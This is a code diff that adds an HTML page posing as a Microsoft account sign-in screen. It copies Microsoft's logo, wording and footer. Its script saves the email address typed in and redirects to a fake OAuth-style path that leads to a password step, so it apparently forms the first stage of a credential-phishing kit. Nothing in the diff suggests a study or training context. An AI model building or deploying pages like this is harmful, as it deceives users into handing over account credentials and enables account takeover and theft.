@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Microsoft</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body {
+  width: 100%; min-height: 100vh;
+  font-family: "Segoe UI", Arial, sans-serif;
+  background: linear-gradient(135deg, #eceef5 0%, #e2e6f0 50%, #d8dff0 100%);
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  padding: 20px;
+}
+
+.card {
+  background: #fff;
+  border-radius: 8px;
+  box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+  padding: clamp(24px, 4vw, 44px) clamp(24px, 4vw, 44px);
+  width: min(460px, 90%);
+  display: flex; flex-direction: column; align-items: center;
+  text-align: center;
+}
+
+.ms-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 6%; }
+.ms-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 20px; height: 20px; }
+.ms-grid span { display: block; }
+.ms-name { font-size: clamp(14px, 2.5vw, 18px); font-weight: 600; color: #1b1b1b; }
+
+h1 { font-size: clamp(20px, 4vw, 26px); font-weight: 700; color: #1b1b1b; margin-bottom: 2%; }
+.subtitle { font-size: clamp(12px, 2vw, 14px); color: #605e5c; margin-bottom: 6%; }
+
+/* champ avec bordure flottante */
+.field-wrap {
+  position: relative;
+  width: 100%;
+  margin-bottom: 3%;
+  border: 1px solid #c8c6c4;
+  border-radius: 2px;
+}
+.field-wrap:focus-within { border-color: #0078d4; border-width: 2px; }
+.field-wrap label {
+  position: absolute;
+  left: 12px; top: 50%;
+  transform: translateY(-50%);
+  font-size: clamp(12px, 2vw, 14px);
+  color: #605e5c;
+  pointer-events: none;
+  transition: all 0.15s;
+}
+.field-wrap input:focus + label,
+.field-wrap input:not(:placeholder-shown) + label {
+  top: 10px; transform: none;
+  font-size: 10px; color: #0078d4;
+}
+.field-wrap input:not(:focus):not(:placeholder-shown) + label { color: #605e5c; }
+.field-wrap input {
+  width: 100%;
+  height: clamp(44px, 6vh, 54px);
+  padding: 18px 12px 6px;
+  font-size: clamp(13px, 2vw, 15px);
+  font-family: inherit;
+  background: transparent;
+  border: none; outline: none;
+  color: #1b1b1b;
+}
+
+.blue-link {
+  align-self: flex-start;
+  font-size: clamp(12px, 2vw, 14px); color: #0078d4;
+  text-decoration: none; cursor: pointer;
+  background: none; border: none;
+  font-family: inherit; margin-bottom: 6%;
+}
+.blue-link:hover { text-decoration: underline; }
+
+.btn {
+  width: 100%;
+  height: clamp(40px, 6vh, 50px);
+  background: #0078d4; color: #fff;
+  font-size: clamp(13px, 2vw, 15px); font-weight: 600;
+  font-family: inherit; border: none; border-radius: 2px;
+  cursor: pointer; transition: background 0.1s;
+  margin-bottom: 5%;
+}
+.btn:hover { background: #106ebe; }
+
+.create { font-size: clamp(12px, 2vw, 14px); color: #1b1b1b; }
+.create a { color: #0078d4; text-decoration: none; }
+.create a:hover { text-decoration: underline; }
+
+.footer {
+  margin-top: 5%;
+  font-size: clamp(10px, 1.5vw, 12px); color: #605e5c; text-align: center;
+}
+.footer a { color: #605e5c; text-decoration: none; margin: 0 8px; }
+.footer a:hover { text-decoration: underline; }
+.footer-bottom { margin-top: 4px; }
+.footer-bottom a { color: #0078d4; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="ms-logo">
+    <div class="ms-grid">
+      <span style="background:#f25022"></span>
+      <span style="background:#7fba00"></span>
+      <span style="background:#00a4ef"></span>
+      <span style="background:#ffb900"></span>
+    </div>
+    <span class="ms-name">Microsoft</span>
+  </div>
+
+  <h1>Log in</h1>
+  <p class="subtitle">Use your Microsoft account.</p>
+
+  <div class="field-wrap">
+    <input id="emailInput" type="email" placeholder=" " autocomplete="email">
+    <label>Email address or phone number</label>
+  </div>
+
+  <button class="blue-link">Have you forgotten your username?</button>
+
+  <button class="btn" onclick="next()">Following</button>
+
+  <p class="create">New to Microsoft? <a href="#">Create an account</a></p>
+</div>
+
+<div class="footer">
+  <div>
+    <a href="#">Help and feedback</a>
+    <a href="#">Terms of Use</a>
+    <a href="#">Privacy and cookies</a>
+  </div>
+  <div class="footer-bottom">
+    Use private browsing if this is not your device. <a href="#">Learn more</a>
+  </div>
+</div>
+
+<script>
+function next() {
+  const email = document.getElementById('emailInput').value.trim();
+  if (!email) return;
+  sessionStorage.setItem('email', email);
+  window.location.href = '/oauth2/v2.0/authorizescope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access%26response_type/login/password/';
+}
+document.getElementById('emailInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter') next();
+});
+</script>
+</body>
+</html>
